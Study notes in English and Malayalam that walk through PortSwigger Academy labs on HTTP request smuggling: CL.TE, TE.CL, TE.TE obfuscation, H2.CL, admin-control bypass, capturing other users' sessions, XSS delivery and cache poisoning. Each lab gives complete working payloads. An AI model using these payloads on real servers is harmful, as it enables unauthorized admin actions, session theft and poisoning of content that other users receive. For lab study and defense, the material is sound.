## HTTP request smuggling :
-->Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.
-->HTTP requests are sent one after another, and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins
-->The `Content-Length` header is straightforward: it specifies the length of the message body in bytes ie, 
```http
POST /search HTTP/1.1 
Host: normal-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 11 

q=smuggling
```

-->The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

```http
Host: normal-website.com 
Content-Type: application/x-www-form-urlencoded 
Transfer-Encoding: chunked 

b 
q=smuggling 
0


```
-->Request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding` header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently
-->The exact way in which this is done depends on the behavior of the two servers:
 -   CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
-   TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
-   TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

==============================================================

### #1 CL.TE vulnerabilities:
-->Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. We can perform a simple HTTP request smuggling attack as follows:

```http
POST / HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 13 
Transfer-Encoding: chunked 

0 

SMUGGLED
```

-->ivide backend smuggeled ennanth puthiya request aayi kanunu

         Lab-1(HTTP request smuggling, basic CL.TE vulnerability)
 -->ivide front end server conent-length um backend server transfer-encoding header use chyuna avasthayan padikunath
 -->so ivide homepage load chyuka.enit athinte GET / request eduth repeater il iduka
 -->aa request ile url path um host: header um ozhichu baaki elam remove chyuka enit ith add chyuka :

```http
POST / HTTP/1.1 
Host: your-lab-id.web-security-academy.net 
Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 6 
Transfer-Encoding: chunked 

0 

G
```

-->enit GET ennath maati POST aakuka. enit send chyuka.apol response ok varum.ini onudi send chyuka apol error varunath kanam `"Unrecognized method GPOST"`  athinartham body il g enna kidakuna sathanam adutha puthiya request il aan vannath

==============================================================

### #2 TE.CL vulnerabilities :
-->Here, the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. We can perform a simple HTTP request smuggling attack as follows:

```http
POST / HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 3 
Transfer-Encoding: chunked 

8 
SMUGGLED 
0


```

-->ivde front end server transfer-encoding header aan process chyunath.so aadyathe chunk 8bytes und athan smuggled.athin shesham ulla chunk 0 enn kanunu so request kazhinju enna manasilakunu
-->ee request backendilek pokumbol backend server content-length header aan process chyunath.so content 3 ennan so athayath aa 8 vere request ullu.so ath kazhinjitulla smuggled adutha request aayitan varuka.ok
-->vere reethiyil paranjal backend server chunked encoding support chyunila athukondan content-lenth header parse chyunath

             Lab-2(HTTP request smuggling, basic TE.CL vulnerability)
 -->ivde aadyam manasilakendath front end server chunked header aan support chyuka. athupole backend content-length header aan support chyuka
 -->so eth request smuggling chyumbozhum namal aadyam front end server kadan pokenda karyaman aadyam nokendath
 -->so ivide front end chunked support chyunu.so last 0 varunath vere namude request body undayirikanam.ath mathramala.==zero kk shesham rand empty line um thazhe aayi venam==
 -->so namal GET /  request edukunu enit athil url , host header ozhich baaki elam remove chyunu.enit namuk venda headers idunu enit test chyam

```http
POST / HTTP/1.1
Host: 0a7700db04db1af9c07f20fa00df00d4.web-security-academy.net
connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

5
abcde
0


```

-->ivide GET maati POST aaki. ith just test chyan vendi itta request aan.final payload vere varum
-->ivide transfer-encoding:chunked koduthu.karanam front end server content-lenth support chyila.so 0 yum athin sesham ulla 2 empty line um kodukuka
-->ivide content-lenth: 3  enn iitu.apol ee 5 enn ezhuthiyathin sesham `\r\n`  varum.so 3 bytes aayi.ini athin sehsam ullath backend parse chyila.karnam backend transfer-encoding header support chyila
-->so ee request send chythal front end server full request send chyum.enit ath backend il ethumbol , backend content-lenth: 3 ennath mathrame parse chyu.so 5 ennath mathram parse chyum.baaki ullath adutha request aayi kanaum
-->so ini onnukoode send chythal ee abcde ennath response il append chythathayi kanam
-->ini final payload nokam :

```http
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```


-->0 kk shesham rand empty line iduka ok
-->ivide content-lenth: 4 enn itt so server ee 5c ennath mathram parse chyum.so baki ullathoke adutha request aayi kanum
-->front end server chunked aan parse chyuka so 0 varunath vere ullathellam eduth backend ilek ayakum
-->5c ennal 92 bytes ine hex encode chythathan.lab-1 il 0 enn koduthath pole aan ivide 5c. athayath 9 enn number in sehsam pine ellam hex aayitan kodukuka.athan oru reethi
-->ivide sumggled request il content-lenth: 15 enn kanam.sherikum 10 bytes mathrame ullu ie,`x=1\r\n0\...` .pakshe content lenth namuk kooduthal koduthalum kozhapam ila.korav kodukathirunamathi.vengil 15 pakaram 25 kodukam.9 onum patila
-->athupole ivide x=1 ennath veruthe koduthathan vere enthengilum 3 bytes verunath koduthalum mathi ie,abc
-->eni send adikuka.apol response ok varum.onude send adikumbol "Unrecognized method GPOST"  enn kanam.apol lab solve aayi

==============================================================

### #3 TE.TE behavior: obfuscating the TE header :
-->ivide both front-end and back-end server um transfer-encoding header support chyum
-->pakshe ithil ethengilum oru server inekond ee TE header parse chyikatha reethiyil namal header entho chyum angane aan ee sitation namal exploit chyunath
-->There are potentially endless ways to obfuscate the `Transfer-Encoding` header. For example:

```java
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x                      (duplicate)

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

x:\nTransfer-Encoding: chunked
	
Transfer-Encoding
: chunked
```

          Lab-3(HTTP request smuggling, obfuscating the TE header)
-->lab open chyuka.enit home page inte GET / request eduth repeater il iduka enit satharana chyunapole url path , host ozhich ellam remove chyth content-length,content-type,transfer-encoding itt send adich nokuka:
```http
POST / HTTP/1.1
Host: 0a6b0036045a6004c0952fcc00d500ef.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
transfer-encoding: chunked

2
as
0


```

-->send adikumbol 200OK kitum.ini onudi send adikumbol pinem 200OK ennan kitunath.so athinartham backendil ithine filter chyunund
-->so namuk ee WAF ine bypass chyanam.so namuk ee transfer-encoding modify chyth nokam
-->namuk mukalil koduthitula ethengilum oru technique use chyth WAF bypass chyan patumon nokam
-->so namuk rand transfer-encoding header use chyam.onil chunked value kodukam mattethil enthengilum kodutho
-->full payload:

```http
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cat

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```


-->ingnae request il koduth send adikuka apol 200OK varum.onukoode send adichal "Unrecognized method GPOST"  enn kanikum apol lab solve aakum

==============================================================

### How to identify HTTP request smuggling vulnerabilities:
-->The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present
-->If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
-->x in shesham no need of 2 empty line
-->Since the front-end server uses the `Content-Length` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Transfer-Encoding` header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.

-->If an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
-->x in shesham no need of 2 empty line ok
-->Since the front-end server uses the `Transfer-Encoding` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Content-Length` header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.
-->te.cl testing application il ulla mattu users ine bhadhikam.so first namal CL.TE test chyth nokuka.enit mathrame TE.CL test chyth nokavu

           Lab-4(HTTP request smuggling, confirming a CL.TE vulnerability via 
                       differential responses)
-->ivide CL.TE  enna vulnerability undon check chyuna lab aan ullath
-->so GET / reqeust repeater ilek viduka
-->ini athil url , host header ozhichu ellam remove chyuka enit `Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked`  kodukuka
-->namuk ariyam (sherikum namuk areela but ith lab aayond ariyam) front end content-length support chyum.so 35 enn length kodukunu.backend transfer-encoding support chyunu
-->final payload :

```http
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

-->ivide front end C.L support chyunath kond request ile ellam edukunu.but backen il chunked mathrame support chyu.so 0 kk shesham ullath next request aayi kanunu
-->ivide lab solve chyanamengil smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response. 
-->athukondan GET /404  enn smuggled request il koduthath
-->ivide x-ignore: x enn kodukanamenonum ila. x: x enn koduthalum aavum pakshe namal correct content-lenth specify chyanam.njan paranju front-end server content-length aan support chyunathen so athinte length correct aayi specify chyunilengil front-end ath kitunath vere wait chyum enit response "read timeout" enna error tharum
-->so ivide namuk lab solve aakumbol response aayi `HTTP/1.1 404 Not Found`   varum ok

==============================================================

### Bypass front-end security controls :
-->Suppose the current user is permitted to access `/home` but not `/admin`. They can bypass this restriction using the following request smuggling attack:

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

-->ivide ee request back endil ethumbol back end ithine rand request aayi kanum.ivide /admin enna request elavarkum accessible alla.access control restriction application use chyunund
-->so ingane smuggling vazhi chyumbol application vijarikum ee /admin enna request real aayi vannathanen. athayath It assumes that the requests have passed through the front-end controls, and so grants access to the restricted URL.

                Lab-5(Exploiting HTTP request smuggling to bypass front-end security 
                           controls, CL.TE vulnerability)
-->ivide namal enthan chyunathenal front-end server il pala restrictions undakam.ivide access control restriction und.so /admin enna pathilek namuk direct pokan patila
-->lab il poi  https://lab/admin ennadikumbol "Path /admin is blocked" enn kanikum.athayath front-end server /admin pathilek ulla access block chyunu
-->so direct oru userinum admin pathilek access ila.athan namuk exploit/bypass chyendath
-->so namuk thodangam
-->aadyam GET / reqeust eduth repeater il iduka.enit sathara chyuna pole content-type,content-length,transfer-encoding ittit 0 koduth enthengilum kodukuka.enit rand pravisham send adikuka

```http
POST / HTTP/1.1
Host: 0a5300f1037ac58bc08535ae00e8002b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded         ---1)
Content-Length: 34                                      ---2)
Transfer-Encoding: chunked
							
0
							
GET /admin HTTP/1.1
foo: foo
```

-->aadyam 0 koduthit just enthengilum koduth send chyuka.enit response kitunathinanusarichan njan last /admin enn idunath.adiyil ulla foo enna dulplicate header idand chythapo "error":"Invalid request" ennu kanichu.so namal just GET um http/1.1 idathe athinte koode thazhe aayi enthengilum headerum iduka ok
-->ingane chythapol randamathe response il namuk kanan patunath 401 unauthorized enna response aan 
-->ee response inte thazhe aayi body il kanam `Admin interface only available to local users` so athinartham namal local aayi keriyal /admin ilek keran patumayirikum
-->so namuk ivide ulla foo maati host: localhost enn kodukam.enit rand pravisham send adikumbol response il kanam `"Duplicate header names are not allowed"`  enn.athayath ee request il ipol rand host header undallo
-->so ini namal enth venamennal 1) ilum 2) ilum ulla aa headers copy chyth ee host: localhost header inte thazhe aayi idanam enit thzhe body il enthengilum kodukuka.enit rand pravisham send adikumbol kanam 200OK enn.so aa response nokiyal kanam namuk admin panel ilek access kitiyirikunu
-->response il user ine delete chyan ulla option und.so /admin/delete?username=carlos enn koduth rand pravoisham send adikumbol namuk 302 found enn kanam.so athinartham carlos enna account delete aayi.so lab solve aayi
-->final payload :

```http
  POST / HTTP/1.1
Host: 0a5300f1037ac58bc08535ae00e8002b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
host: localhost
joo: jj
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

jkjkj
```

-->ivide lab il namal carlos ine delete chythengilum.namude lakshyam ennath unauthorized aaya pathilek pokuka ennathayirunu.so athukondayirikam randmathe request GET aayathen thonunu 
-->ivide aadyathe C-L il 151 ittath ariyalo karanam lab inte peril thane und CL.TE enn.athayath front-end content-lenth mathrame support chyu athukondan

==============================================================

          Lab-6(Exploiting HTTP request smuggling to bypass front-end security 
                     controls, TE.CL vulnerability)
 -->ividem nerthepole thane aaku ulla vyathyasa enthenal front-end server ivide content-lenth alla pakaram transfer-encoding aan support chyunath
 -->ivide lab open chyth /admin ilek pokan nokumbol block chyunath kanam.so front-end server /admin ilek ulla path block chyunu.so namuk ith bypass chyanam
 -->epozhum chyuna pole url path , host ozhich elam remove chyuka enit C-T,C-T,T-E request il iduka.enthengilum body ilum iduka
 -->ivide back-end content lenth mathrame support chyu.so repeater option il poi content-lenth automatic aayi add chyunath untick chyuka
 -->final payload nokam :

``` http
POST / HTTP/1.1
Host: 0a6f00b7034014a9c07c46d200d300da.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```


-->ivide 87 ennath 135 inte hex encoded value aan.athayath last ulla 0 vere ulla character bytes aan ath
-->ivide ulla /admin/delete?user... ennath namal adyame kandethiyathal
-->aadyam backend il enth support chyunu.pine athinu shesham aan oron namal test chyunath
-->aadyam nammal `60 POST /admin HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0`    ennan koduthath apol kanam local users inu mathrame access ullu so nammal ee reqeust inte koode host: localhost koduthu
-->ingane localhost enn koduthapol namuk admin panel kiti.athinu sheshaman namal carlos enna account delet chyunath ok
-->ithil confusion aayitula part enthenal correct aayi chunk bytes ethra unden kandethuka.

==============================================================

### Revealing front-end request rewriting :
-->In many applications, the front-end server performs some rewriting of requests before they are forwarded to the back-end server, typically by adding some additional request headers. For example, the front-end server might:
-   terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
-   add an `X-Forwarded-For` header containing the user's IP address;
-   determine the user's ID based on their session token and add a header identifying the user; or
-   add some sensitive information that is of interest for other attacks.

-->so front-end chelapo headers oke add chyum.apol namude smuggled request ilu  aa headers onum aadd chyunilegil back end aa request maryathek process chyanamenila

-->There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

-   Find a POST request that reflects the value of a request parameter into the application's 
 response.
-   Shuffle the parameters so that the reflected parameter appears last in the message body.
-   Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.


          Lab-7(Exploiting HTTP request smuggling to reveal front-end request 
                       rewriting)
-->ivide namal padikan pokunath enthennal.chela application ile front-end server request ayakunathin mumb extra karyangal request il add chyum.so aa karyangal namude smuggled request ilum undakanam illengil back-end process chyila
-->mukalil ulla 3 points vaik apo manasilakum
-->ivide lab il parayunund front-end chunked encoding support chyilan.so C.L use chyanam
-->so first namal GET / request eduth repeater il iduka.enit epozhum chyuna pole C.T,C.L,T.E iduka
-->eni namuk areela front-end enthokeyan request il extra add chyunathen.so namuk ethengilum oru post request eduth athil ulla ethengilum parameter value reflect chyuna request eduthit athil namude smuggled request iduka apol namuk kanam front-end server enthokeyan add chyunathen
-->so site il oru search bar und athil enthengilum type chyth search chyumbol kanam ath oru post request aan.athile value response il reflect chyunund
-->so namude GET / request um athupoel ee search inte post request um orumich eduth idam
-->ee search request (post) aan smuggled aayi vekunath.so ee smuggled request il enthoke add akunund enn namuk nokanam.so ee request inte thazhe body il aayi search parameter und athil ee smuggled request onumkoodi iduka enit url encode chyuka enit send adikumbol namuk response il kanam oru `X-DijiZK-Ip: 103.153.105.75` enna header ithil use aakkunund.request nok apo manasilakum :

```http
POST / HTTP/1.1                      ---1)
Host: 0a8b0016043ddba9c0ae0ad300e800ee.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124                  ----2)
Transfer-Encoding: chunked           ---3)

0

POST / HTTP/1.1                    ---4)
Content-Type: application/x-www-form-urlencoded
Content-Length: 200                 ---5)
Connection: close

search=POST+/+HTTP/1.1             ---6)
Content-Type%3a+application/x-www-form-urlencoded
Content-Length%3a+200
Connection%3a+close
```

-->ivide 1) ennath GET / request aan.ath post aakiyathan.
-->2) um 3) um ariyalo ee rand headers accept chyunengile ee vulnerabilityk scope ulu
-->content-lenth correct 124 kodukanam.karanam front-end C.L aan nokunath
-->back-end chunked aan nokunath
-->ivide 4) ileyum 6) ileyum request same thane aan.4) il ulla request il enthoke aan front-end aad chyunath enn nokan aan ee search request il aa same smuggled request itt test chyunath.NOTE: url encode chyuka
-->5) il 200 enn koduthath enthoke aan namuk reflect chyendath ennanen thonun
-->so ee request ayakumbol response il namuk kanan patum enthoke aan server extra add chyunath.ivide `X-DijiZK-Ip: 103.153.105.75`  aan
-->so ee X-DijiZK-Ip: 127.0.0.1 enn koduth namuk admin pathilek keran patumon nokam
-->so aadyam smuggled request post ullath get aakuka.smuggled request ile C.L: 10 kodutkam enit aa search enna parameter maati just x=1 enn kodukam
-->ipol request ile bytes ellam mari so 2) ile lenth il 143 kodukuka enit send chhyumbol namuk admin panel response il kanam
-->chelapo kore pravisham send adikendi varum ok
-->ini ee smuglled request ile GET /admin maati `GET /admin/delete?username=carlos HTTP/1.1`   ennakiyal carlos inte account delete aakum.so lab solve aayi
-->final payload :

```http
POST / HTTP/1.1
Host: 0a8b0016043ddba9c0ae0ad300e800ee.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-DijiZK-Ip: 127.0.0.1
Content-Length: 10
Connection: close

x=1
```

==============================================================

### Bypassing client side filters
--> chela samayangalil servers clientumayi(browser) authenticate chyunath certificate vechitan. This certificate contains their "common name" (CN), which should match their registered hostname. The client can then use this to verify that they're talking to a legitimate server belonging to the expected domain
-->Some sites go one step further and implement a form of mutual TLS authentication, where clients must also present a certificate to the server. In this case, the client's CN is often a username or suchlike, which can be used in the back-end application logic as part of an access control mechanism
-->For example, front-end servers sometimes append a header containing the client's CN to any incoming requests:

```http
GET /admin HTTP/1.1 
Host: normal-website.com 
X-SSL-CLIENT-CN: carlos
```
-->As these headers are supposed to be completely hidden from users, they are often implicitly trusted by back-end servers. Assuming you're able to send the right combination of headers and values, this may enable you to bypass access controls
-->ivide namuk ee X-SSL-CLIENT-CN enna header il admin, administrator ennoke itt test chyam

==============================================================

### Capturing other users' requests :
-->namuk mattu users inte request steal chyan patum.athayath namal oru smauugled request undakunu enit send adikunu.ini matoru user aa page request chyumbol namuk aa request kitum
-->eg: oru comment chyuna request und.so namal aa request smuggle chyan use chyunu.so comment= enn parameter vere namal smuggled request il iduka.apol namude request avide pause aayi but stop aayila.karanam application comment venam ennale nadaku.so ini matoru user GET / request edukumbol(ee GET / request inte thazhe aayan namal /post/comment smuggle chyunath) ee smuggled post request run aakum so aa user inte session namuk edukan patum.lab nokumbo onukoodi manasilakum

        Lab-8(Exploiting HTTP request smuggling to capture other users' requests)
-->ivide front-end transfer-encoding support chyila
-->aadyam lab open chyuka enit GET /  request eduth repeater il iduka
-->ini site il blog post und.so onnil keruka enit athil comment chyuna option und.so athil enthengilum comment chyth send chyuka
-->aa request repeater il iduka.ath POST request aan.so C.T,C.L,T.E  headers satharan cherikuna pole chyuka.enit athil session cookie, csrftoken, pine comments inte parameters okke itt onukudi test chyuka.apol 302 kitunund

```http
POST /post/comment HTTP/1.1
Host: 0a2a00a203669796c05db2d4002600de.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Cookie: session=jPcj7tfUxIuQ3S9T2hXbOJqpBOIYDuA2
Connection: close

csrf=lejKhAVm6TdMLlEZ3KP9yNOdrhmKVvmL&postId=8&comment=jossdfsdu&name=josuasd&email=josusd%40gmail.com&website=
```

-->ivide comment= enna parameter mattu parameters inte idakan kidkunath.so aa comment enna parameter eduth lasst aayi iduka ie website=&comment=josu. ini send chyumbozhum result 302 kitunund.so parameter marikidanalum work aakunund
-->ini enth chyanamenal ee request namuk smuggle chyanam.enit ee comment= enna parameter il aayi vere oru user enthengilum request chyumbol avante request namuk ee comment il append chyum apol ath automatic aayi comment boxil varum
-->njan paranju ivide back-end aan transfer encoding support chyunathen.so 0 itt ee request smuggle chyam
-->smuggle chyenda request kiti.ini eth genuine request il aan smuggle chyendath enn nokam. so namuk GET /   request thane edukam.enit athil cherakm :

```http
POST / HTTP/1.1
Host: 0a2a00a203669796c05db2d4002600de.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 355        ---1)
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0a2a00a203669796c05db2d4002600de.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 810          ---2)
Cookie: session=jPcj7tfUxIuQ3S9T2hXbOJqpBOIYDuA2  ---3)
Connection: close

csrf=lejKhAVm6TdMLlEZ3KP9yNOdrhmKVvmL&postId=8&name=josuasd&email=josusd%40gmail.com&website=&comment=shajappan
```



-->ivide namuk final payload kanam. GET /   request maati POST ennaki karanam ariyalo POST request il mathrame smuggling chyan patu
-->1) mathe content-lenth ee requst full ayitula content length.front-end C.L aan support chyunath.so correct lenth kodukanam ilengil read timeout error varum
-->2)  mathae C.L nok ith correct length alla.ee lenth koduthath enthanennal namuk user il ninum append chyapeduka lenth ethra venam enn theerumanikuna request aan
-->ivide correct aayi th namal koduthale user inte session token kitu
-->3)  il ulla session ennath namude real aaya session aan.karnam namal comment iduna request aan smuggle chyan eduthath so ath oru action request aan so athil session,csrf oke undakum
-->so ini mumb chytha lab ukale pole rand pravisham send adikenda.ivide otta pravisham send adichamathi.oru pravisham send adikumbol request pokum enit ee comment enna athayath avide normal user inte request append aayi comment boxil save aakum ie , `shajappan GET / HTTP/1.1 Host:.....` enn namuk kanam
-->ithil session token undakum.so ath copy chyth browser ile cookie extension il poi ee token save chyth refresh adichal lab solve aakum.ie namal carlos aayi marum ok

==============================================================

### Using HTTP request smuggling to exploit reflected XSS :
-->If an application is vulnerable to HTTP request smuggling and also contains reflected XSS, you can use a request smuggling attack to hit other users of the application
-->It requires no interaction with victim users. You don't need to feed them a URL and wait for them to visit it

       Lab-9(Exploiting HTTP request smuggling to deliver reflected XSS)
-->aadyam lab open chyuka enit GET /  request eduth repeater il iduka
-->ini athile ethengilum blog post edukuka enit nokiyal kanam athile `user-agent: ...a"/<script>alert(1)</script>`   il ingane script chythal namuk aa response il kanam ee script angane thane html il add ayitund.athayath script reflect aakunund.so ee response eduth browser il ittal namuk kanam xss trigger aakunund
--->so namuk ee GET /post?postId=3  request namuk smuggle chyam.apol ee request send aayikazhiyumbol next user ee page ilek pokumbol alert pop up aakum
-->so home page int GET /  request eduth aadyam chyuka enit ee reuquest itt smuggle chyuka
-->final payload :

```http
POST / HTTP/1.1
Host: 0a8600a1039293f6c07e0aa900540013.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

-->ini send adikuka apol namuk kanam namude response il ee script reflect aakunund.ini browser il poi ee particular blogpost refresh chythal alert pop up aakum

==============================================================

          Lab-10(Exploiting HTTP request smuggling to perform web cache poisoning)
-->ivide front-end content-lenth aan support chyuka
-->aadyam lab open chyuka enit GET /  request eduth repeater il iduka
-->ini ethengilum oru blog post click chyuka enit aa page il next page enna button undakum.so ath click chyuka enit aa request eduth repeater il iduka `GET /post/next?postId=1`
-->ini aadyathe GET /  request eduth satharana chyuna pole C.T,C.L,T.E iitum pine get mati POST aakuka
-->enit namude ee GET /post/next?postId=1  request smuggle chyanayi iduka enit athile host: josu ennu kodukam enit send kore pravisham adikuka apol namuk 302 FOUND enn kanum arthil `Location: https://josu/post?postId=2`  enn response il kanam aa request nokama :

```http
POST / HTTP/1.1
Host: 0a8100fe0454db44c0b86a2700430036.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked
							
0
							
GET /post/next?postId=1 HTTP/1.1   ---1)
Host: josu                         ---2)
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
							
x=1
```
-->so namuk ee request smuggle chyumbol namuk ishtamulla host ilek redirect chyan patunund
-->ini namude exploit server il poi file:  /post enn kodukuka.karanam blog post inte next post edukuna redirection request aanalo namal smuggle chyunath.athayath ivide 1). 
-->http content-type application/javscript ennath maati text/javascript ennakuka.ini body il alert(document.cookie) enn koduth save chyuka
-->ini enth venamenal http history pokuka.athil kanan patum home page load aakumbol `GET /resources/js/tracking.js`   enna oru javascript file ilek request pokunund.so ee file application retrieve chyunu.ithinte reponse il nokiyal kanam x-cache: hit een so ee request inte response cache chyapedunund
-->so ee request eduth repeater il iduka
-->ini mukalile main payload ile 2) host: exploitserver url kodukuka
-->ini send adikuka enit namude  `GET /resources/js/tracking.js`  request thottapurathe undakumalo athum send adikuka.angane mari mari send adichondirikuka
-->so aadyam redirection request aan send adikendath.enitan eee /tracking.js request send chyendath
-->ith engane nadakunun ennal namal next post alle smuggle chyunath.so ee smuggled request backend process chyth kazhinjal ee request in venda js files aan namal GET /resources/js/tracking.js  enn request ilude edukunath.so angane varumbol namude exploit server il ninum alert(document.cookie) edukunu..angane aanen thonun enik sherik katheela

==============================================================

# ==Advances HTTP request smuggling :==

### HTTP/2 -The sequel is always worse(james kettle)
-->http/1.1 ennath string format il aan read chyunath but http/2 binary format il aan read chyunath
-->the majority of servers that speak http/2 to the client actually rewrite requests as h1 inorder to talk to the back-end server.this behaviour is very common
-->http/1.1 and http/2 are spoken on the same port.so the client needs to know which protocol it should be speaking
-->HTTP/1 is a text-based protocol, so requests are parsed using string operations. For example, a server needs to look for a colon in order to know when a header name ends.
-->HTTP/2 is a binary protocol like TCP, so parsing is based on predefined offsets and much less prone to ambiguity
-->source -> https://portswigger.net/research/http2
HTTP/2 messages are sent over the wire as a series of separate "frames".Therefore, the length of the request is the sum of its frame lengths.

### HTTP/2 downgrading :
-->HTTP/2 downgrading is the process of rewriting HTTP/2 requests using HTTP/1 syntax to generate an equivalent HTTP/1 request
-->Web servers and reverse proxies often do this in order to offer HTTP/2 support to clients while communicating with back-end servers that only speak HTTP/1
-->This practice is a prerequisite for many of the attacks covered in this section.
-->pala serversum(reverse proxy) ee reethi use chyunun.back-end in http/1.1 aayit mathrame request edukan patu.so servers in http/2 ile request convert chyth http/1.1 ielk request matanam enit back-end response tharumbol veendum ath reverse chyth http/2 aaki client in kodukanam
-->As we already know HTTP/2 requests don't have to specify their length explicitly in a header. But during downgrading, this means front-end servers often add an HTTP/1 `Content-Length` header

#### #1  H2.CL vulnerabilities :
                      Lab-11(H2.CL request smuggling)
-->here the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.
-->ivide content-lenth support chyum
-->ivide namal enthan chyunathenal ee lab ile server namude request back-end ilek ayakunath in mumb http/1.1 ilek aakunu.so namal oru redirection vulnerability kandethum enit namude exploit server ilek user ine ayakum
-->so lab open chyuka enit GET /   request eduth repeater il iduka
-->repeater il poi Request Attributes eduth HTTP/2 kodukuk 
-->mukalile Repeater il poi content-lenth untick chyuka.athupole Allow HTTP/2 ALPN override tick chyuka enale namuk correct aayi repeater il send chyanoke patu
-->ini namal ee GET /  request il test chyth nokam smuggling aakunundon :

                POST / HTTP/2
				Host: 0a4400eb047edba9c0d4a8f3006600c7.web-security-academy.net
				Content-Length: 0
				
				josu

-->ee request send adichondirikuka.apol namuk kanam 404 NOT FOUND enna response. athinartham back-end in ee josu enna sathanam process chyan patunila. athinatham namuk ee josu enna sathanam smuggle chyan patunund ennan.so namuk vere enth venemengilum ini smuggle chyam
-->ee GET /  request inte normal response il namuk kanam oru /resourses enna oru path. athayath html tag il src= , href= il oke /resources/js   or /resources/labheader..  enoke aayit
-->so namuk ee oru path ilek oru GET request smuggle chyth nokam :

                    POST / HTTP/2
					Host: 0a4400eb047edba9c0d4a8f3006600c7.web-security-academy.net
					Content-Length: 0
					
					GET /resources HTTP/1.1
					host: josu.com
					content-lenth: 5
					
					x=1
-->ith send adichondiriumbol namuk response kanam 
HTTP/2 302 Found
Location: https://josu.com/resources/
Content-Length: 0

-->athayath josu.com enna fake sthalathek redirect aakunund
-->so namude exploit server ilek pokuka enit athile file path /resources ennakuka.enit exploit server inte lab id copy chyuka.body il alert(document.cookie) iduka
-->enit josu.com il paste chyuka.enit send adichondirikuka.ivide lab il user oro 10 second koodnthorum visit chyum apol ee xss trigger aakum.final payload :

